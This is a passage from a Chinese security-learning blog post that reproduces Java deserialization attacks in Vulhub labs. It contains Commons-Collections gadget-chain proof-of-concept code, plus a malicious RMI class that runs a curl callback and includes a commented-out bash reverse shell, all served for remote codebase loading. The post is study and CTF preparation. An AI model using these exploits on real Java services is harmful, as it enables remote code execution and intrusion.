class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// Transformer是⼀个接⼝，它只有⼀个待实现的⽅法</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="comment">// ConstantTransformer是实现了Transformer接⼝的⼀个类，它的过程就是在构造函数的时候传⼊⼀个</span></span><br><span class="line">                <span class="comment">//对象，并在transform⽅法将这个对象再返回</span></span><br><span class="line">                <span class="comment">// 所以他的作⽤其实就是包装任意⼀个对象，在执⾏回调时返回这个对象，进⽽⽅便后续操作</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.getRuntime()),</span><br><span class="line">                <span class="comment">// InvokerTransformer是实现了Transformer接⼝的⼀个类，这个类可以⽤来执⾏任意⽅法，这也是反序</span></span><br><span class="line">                <span class="comment">//列化能执⾏任意代码的关键。</span></span><br><span class="line">                <span class="comment">// 在实例化这个InvokerTransformer时，需要传⼊三个参数，第⼀个参数是待执⾏的⽅法名，第⼆个参数</span></span><br><span class="line">                <span class="comment">//是这个函数的参数列表的参数类型，第三个参数是传给这个函数的参数列表</span></span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[]&#123;String.class&#125;,</span><br><span class="line">                <span class="keyword">new</span> Object[]&#123;<span class="string">"calc.exe"</span>&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串</span></span><br><span class="line">        <span class="comment">//在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span></span><br><span class="line">                ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        <span class="comment">// TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可</span></span><br><span class="line">        <span class="comment">//以执⾏⼀个回调。</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>,</span><br><span class="line">                transformerChain);</span><br><span class="line">        <span class="comment">// 触发执行Transformer回调</span></span><br><span class="line">        outerMap.put(<span class="string">"test"</span>, <span class="string">"xxxx"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>poc2</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> org.vulhub.Ser;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections2</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">// 反序列化 不能序列化Runtime 因为没有实现 java.io.Serializeable</span></span><br><span class="line"><span class="comment">//        Method f = Runtime.class.getMethod("getRuntime");</span></span><br><span class="line"><span class="comment">//        Runtime r = (Runtime) f.invoke(null);</span></span><br><span class="line"><span class="comment">//        r.exec("/System/Applications/Calculator.app/Contents/MacOS/Calculator");</span></span><br><span class="line">        <span class="comment">// Transformer是⼀个接⼝，它只有⼀个待实现的⽅法</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"getMethod"</span>, <span class="keyword">new</span> Class[] &#123; String.class,</span><br><span class="line">                        Class[].class &#125;, <span class="keyword">new</span></span><br><span class="line">                        Object[] &#123; <span class="string">"getRuntime"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123; Object.class,</span><br><span class="line">                        Object[].class &#125;, <span class="keyword">new</span></span><br><span class="line">                        Object[] &#123; <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>, <span class="keyword">new</span> Class[] &#123; String.class &#125;,</span><br><span class="line">                        <span class="keyword">new</span> String[] &#123;</span><br><span class="line">                                <span class="string">"calc.exe"</span> &#125;),</span><br><span class="line">        &#125;;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ChainedTransformer也是实现了Transformer接⼝的⼀个类，它的作⽤是将内部的多个Transformer串</span></span><br><span class="line">        <span class="comment">//在⼀起。通俗来说就是，前⼀个回调返回的结果，作为后⼀个回调的参数传⼊，</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span></span><br><span class="line">                ChainedTransformer(transformers);</span><br><span class="line"></span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"test"</span>, <span class="string">"xxxx"</span>);</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"xxxx"</span>);</span><br><span class="line">        <span class="comment">// TransformedMap⽤于对Java标准数据结构Map做⼀个修饰，被修饰过的Map在添加新的元素时，将可</span></span><br><span class="line">        <span class="comment">//以执⾏⼀个回调。</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>,</span><br><span class="line">                transformerChain);</span><br><span class="line">        <span class="comment">// 触发执行Transformer回调</span></span><br><span class="line">        <span class="comment">//        outerMap.put("test", "xxxx");</span></span><br><span class="line"></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor constructor = clazz.getDeclaredConstructor(Class.class, Map.class);</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        Object obj = constructor.newInstance(Retention.class, outerMap);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// 序列化</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        System.out.println(barr);</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object) ois.readObject();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4><p>看了<code>URLDNS</code>和<code>common-collections</code>这两条链子的利用和原理，利用倒是会了，原理确实是看不懂，也许是因为没有java相关的底子，我不知道是不是该继续看下去，因为确实挺费劲的，因为上次ctf题碰到java反序列化的题，做不起，所有才来学习java反序列化，但是java反序列化的坑很深，也并非一周两周就能够掌握，迷茫了。目前想法就是，找些环境来实践，先不管原理，先会利用起来，至少ctf中遇到能做得起。</p>
+<h3 id="Java-RMI-codebase-远程代码执行漏洞复现"><a href="#Java-RMI-codebase-远程代码执行漏洞复现" class="headerlink" title="Java RMI codebase 远程代码执行漏洞复现"></a>Java RMI codebase 远程代码执行漏洞复现</h3><h4 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h4><p><a href="https://vulhub.org/#/environments/java/rmi-codebase/" target="_blank" rel="noopener">https://vulhub.org/#/environments/java/rmi-codebase/</a></p>
+<p>使用Docker拉取漏洞环境</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">root@VM-0-12-ubuntu:/home/ubuntu/vulhub-master/java/rmi-codebase# docker-compose build</span><br><span class="line">/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.</span><br><span class="line">  from cryptography.hazmat.backends import default_backend</span><br><span class="line">Building rmi</span><br><span class="line">Step 1/9 : FROM openjdk:8u222-jdk</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> fcb6c0ce31f9</span></span><br><span class="line">Step 2/9 : LABEL maintainer="phithon &lt;root@leavesongs.com&gt;"</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 68434cb7eb62</span></span><br><span class="line">Step 3/9 : ENV RMIIP="127.0.0.1"</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Using cache</span></span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 57428be9e0ea</span></span><br><span class="line">Step 4/9 : COPY src/ /usr/src/</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 0511fe1104fc</span></span><br><span class="line">Step 5/9 : WORKDIR /usr/src</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 5bb6dbc8842c</span></span><br><span class="line">Removing intermediate container 5bb6dbc8842c</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 81322e0babb4</span></span><br><span class="line">Step 6/9 : RUN set -ex     &amp;&amp; javac *.java</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 985d742f1604</span></span><br><span class="line">+ javac Calc.java ICalc.java RemoteRMIServer.java</span><br><span class="line">Removing intermediate container 985d742f1604</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 679d43986c84</span></span><br><span class="line">Step 7/9 : EXPOSE 1099</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 1601dc557ad0</span></span><br><span class="line">Removing intermediate container 1601dc557ad0</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> e2d1bb14a7ab</span></span><br><span class="line">Step 8/9 : EXPOSE 64000</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 62b7eb3c5aff</span></span><br><span class="line">Removing intermediate container 62b7eb3c5aff</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 9da81fd4e87c</span></span><br><span class="line">Step 9/9 : CMD ["bash", "-c", "java -Djava.rmi.server.hostname=$&#123;RMIIP&#125; -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy RemoteRMIServer"]</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> a66f149ea8b5</span></span><br><span class="line">Removing intermediate container a66f149ea8b5</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> d58e781c5c25</span></span><br><span class="line">Successfully built d58e781c5c25</span><br><span class="line">Successfully tagged rmi-codebase_rmi:latest</span><br></pre></td></tr></table></figure>
+
+<p>启动环境</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose run -e RMIIP=your-ip -p 1099:1099 -p 64000:64000 rmi</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@VM-0-12-ubuntu:/home/ubuntu/vulhub-master/java/rmi-codebase# docker-compose run -e RMIIP=xx.xx.xx.xx -p 1099:1099 -p 64000:64000 rmi</span><br><span class="line">/usr/local/lib/python2.7/dist-packages/paramiko/transport.py:33: CryptographyDeprecationWarning: Python 2 is no longer supported by the Python core team. Support for it is now deprecated in cryptography, and will be removed in the next release.</span><br><span class="line">  from cryptography.hazmat.backends import default_backend</span><br><span class="line">setup SecurityManager</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>因为是在云服务器上，执行反弹shell的话，无法反弹到本地主机，所以这里准备执行一条命令<code>curl http://xx.xx.xx.xx:8000/exp</code> 来验证命令是否被执行</p>
+</blockquote>
+<p>首先构造一个恶意类</p>
+<p>RMIClient.java</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line"><span class="comment">//            Runtime.getRuntime().exec(new String[]&#123;"bash","-c","bash -i &gt;&amp; /dev/tcp/172.20.10.1/4444 0&gt;&amp;1"&#125;);</span></span><br><span class="line">            Runtime.getRuntime().exec(<span class="string">"curl xx.xx.xx.xx:8000/exp"</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Payload</span> <span class="keyword">extends</span> <span class="title">ArrayList</span>&lt;<span class="title">Integer</span>&gt;</span></span><br><span class="line"><span class="class">    </span>&#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ICalc r = (ICalc)</span><br><span class="line">                Naming.lookup(<span class="string">"rmi://xx.xx.xx.xx:1099/refObj"</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> Payload();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li)); &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RMIClient().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// xx.xx.xx.xx 替换成云服务器地址</span></span><br></pre></td></tr></table></figure>
+
+<p>编译 </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javac RMIClient.java</span><br></pre></td></tr></table></figure>
+
+<p>会得到两个文件<code>RMIClient$Payload.class</code> 和 <code>RMIClient.class</code></p>
+<p><img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAASwAAAEsCAMAAABOo35HAAAABGdBTUEAAK/INwWK6QAAABl0RVh0U29mdHdhcmUAQWRvYmUgSW1hZ2VSZWFkeXHJZTwAAAC9UExURVlZWdPT07KysmRkZIWFhfT09JmZmWZmZm9vb39/fxkZGUxMTDMzM3p6epCQkKamppubm729venp6cjIyN7e3tbW1s/Pz8LCwnx8fLS0tFZWVoiIiI+Pj6GhoeTk5Glpabu7u93d3evr66CgoJSUlKqqqsnJyeDg4Hd3d8PDw+Xl5bi4uNHR0dvb26Ojo6urq+fn51hYWDg4OCgoKHBwcK2traenp0FBQe7u7vHx8U5OTre3t8zMzHV1df///7GrnpQAAAA/dFJOU///////////////////////////////////////////////////////////////////////////////////AI4mfBcAAAUGSURBVHja7NoJb6M4GMZxY0NCD64kve/pMZ2d3Z297+X7f6zFNmBAMUXa6URl/q9UJSWPUPzrizFWRUlNLgEBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYYIEFAVhggQUWWGBBABZYYIEFFlgQgAUWWGCBBRYEYIEFFlhggQUBWGCBBRZYYEEAFlhggQUWWBCABRZYYIEFFgRggQUWWGCBBQFYYIEFFlhgQQAWWGCBBRZYEIAFFlhggQUWBGCBBRZYn6cCIcRXgvX/h9qcIVBqDdbEM8RCxGCB9QqXYRwHYDHBgwXWl8eKZKiESHI3Ba1kWs3fKixcaJUl1YyeBm7Ocq+yLItUiVBGnXxenSHJolIKEcwHq6ikbOX1YGVzQCTN8LPmSLreghUl9sN4Uw7yajMrLC0TZ1ImzqY6FEop0+pIaEN5HaoOxVuwEqFyc4I46uSlzOLqgxlh6UaR9l3VYWl9Fdoxb1Q90KJtu41pwwFW/WHhTtW8i7TafLCqRsk6bsGw63L9qurXRmuIlbT9lDQnlXU+nBFW1Q2qnZbDprWa2tjR90LZFqx1/+Td/HpGWLlrLDvIwTcx6dQ1Vrntbig68cDms3JwbA5Y1azs1ger6sNV/bbIw1jU81MvNAGrl58RVn8ozW+btF08iGFoAlYvP3csfVur1gJBEIA1uBmue5dhZDOyO2epbmgCVi8/I6x0MMHH9pjsTfBhNzQBq5uPZoQlB0uH3DZG4EZqQ26fL3sZq5uf09Ih6qw3i/pm6BZO0qZX7rrUS68Xsbr5ZE4rePMk08pk9aUZugfqppvs6AM1Acvlo/StP+6EbW06z8hJqxbYp2BZPQUnFsLsKuhQdaHqn5ewbF7KXIn0jWO5MqOQ7RaNLPtbNMmmhimj0GUmYLl8Gs0Lq4wyPbTu1l2QKqHSouzs3OlDIslW5SQsnY/NXmFplyNvEuuLV/Tau9BzwiraDUSwXmysztYWWNtL1psXeumgIrDGaqXvBfUuvtqUYI3V2t1wk1e2msFluJJm6zDJXv/fIfjPP7DAAgsssCiwwAILLLDAosACCyywwAKLAgsssMACC6zt9fDz/v75tyOB+98PD2+ORgKffjw4OP1uJPDxl+Xy8v1I4MPF3t7VNyOB4/vF4uzdzrG+39f1kz/w66Guv/yBvw90KX/gZKkr8Qf+2dOV+gNHC12/7RxrabD2/a31bLAO/a11YbAO/K21MFhLf2s9Gqw9f2vdGqzFu11jnVusE2/gxmI9eQOnFuvYG7i0WH7uK4t15w2cWazrXWP9a7H8f/bQYvm/6IPF+sF/pVssf19Ii/WH/0K2WH/uGuvEWC39gSdj9Twy+Rqri5EZx1gt/IE7Y/XoD1wbq9vd3w1PlufnD2OBp+ebm/uxwPHF6emnscDR4vLy41jg7vHq6sNY4Pr27OyYdRaLUrDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssMCiwAILLLDAAosCCyywwAILLAossMACCyywKLDAAgsssL6u+k+AAQCR9eHtLKvLfwAAAABJRU5ErkJggg==" data-original="https://hexo-1253463144.cos.ap-chongqing.myqcloud.com/image-20211106120324693.png" alt="image-20211106120324693"></p>
+<p>然后将这两个文件上传至云服务器，用<code>python3 -m http.server</code> 启动一个http服务器进行监听。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ubuntu@VM-0-12-ubuntu:~/Temp$ ls</span><br><span class="line"> RMIClient.class  'RMIClient$Payload.class'</span><br><span class="line">ubuntu@VM-0-12-ubuntu:~/Temp$ python3 -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>之所以这样做是因为正常执行的时候，我们可以通过<code>-Djava.rmi.server.codebase=http://xx.xx.xx.xx/</code>控制codebase</p>
+</blockquote>
+<p>而这个codebase有什么作用呢？</p>
+<p>P神说的</p>
+<blockquote>
+<p>既然这个Java系列的文章要尽量全面地梳理Java知识，我们不妨将时间线拉的久远一些……<br>曾经有段时间，Java是可以运行在浏览器中的，对，就是Applet这个奇葩。在使用Applet的时候通常需<br>要指定一个codebase属性，比如：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&gt; &lt;applet code=<span class="string">"HelloWorld.class"</span> codebase=<span class="string">"Applets"</span> width=<span class="string">"800"</span> height=<span class="string">"600"</span>&gt;</span><br><span class="line">&gt; &lt;/applet&gt;</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
+</blockquote>
+<blockquote>
+<p>除了Applet，RMI中也存在远程加载的场景，也会涉及到codebase。</p>
+<p>codebase是一个地址，告诉Java虚拟机我们应该从哪个地方去搜索类，有点像我们日常用的CLASSPATH，但CLASSPATH是本地路径，而codebase通常是远程URL，比如http、ftp等。</p>
+<p>如果我们指定 codebase=<a href="http://example.com/" target="_blank" rel="noopener">http://example.com/</a> ，然后加载 org.vulhub.example.Example 类，则<br>Java虚拟机会下载这个文件 <a href="http://example.com/org/vulhub/example/Example.class" target="_blank" rel="noopener">http://example.com/org/vulhub/example/Example.class</a> ，并作为<br>Example类的字节码。</p>
+<p>RMI的流程中，客户端和服务端之间传递的是一些序列化后的对象，这些对象在反序列化时，就会去寻<br>找类。如果某一端反序列化时发现一个对象，那么就会去自己的CLASSPATH下寻找想对应的类；如果在本地没有找到这个类，就会去远程加载codebase中的类。</p>
+<p>这个时候问题就来了，如果codebase被控制，我们不就可以加载恶意类了吗？</p>
+<p>对，在RMI中，我们是可以将codebase随着序列化数据一起传输的，服务器在接收到这个数据后就会去<br>CLASSPATH和指定的codebase寻找类，由于codebase被控制导致任意命令执行漏洞。</p>
+</blockquote>
+<p>接下来使用一个正常的客户端进行连接</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.rmi.Naming;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.ArrayList;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">RMIClient</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Payload</span> <span class="keyword">extends</span> <span class="title">ArrayList</span>&lt;<span class="title">Integer</span>&gt; </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">lookup</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ICalc r = (ICalc)</span><br><span class="line">                Naming.lookup(<span class="string">"rmi://xx.xx.xx.xx:1099/refObj"</span>);</span><br><span class="line">        List&lt;Integer&gt; li = <span class="keyword">new</span> Payload();</span><br><span class="line">        li.add(<span class="number">3</span>);</span><br><span class="line">        li.add(<span class="number">4</span>);</span><br><span class="line">        System.out.println(r.sum(li));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> RMIClient().lookup();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>先编译</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">javac RMIClient.java</span><br><span class="line">java -Djava.rmi.server.useCodebaseOnly=false -Djava.rmi.server.codebase=http://example.com/ RMIClient</span><br></pre></td></tr></table></figure>
+
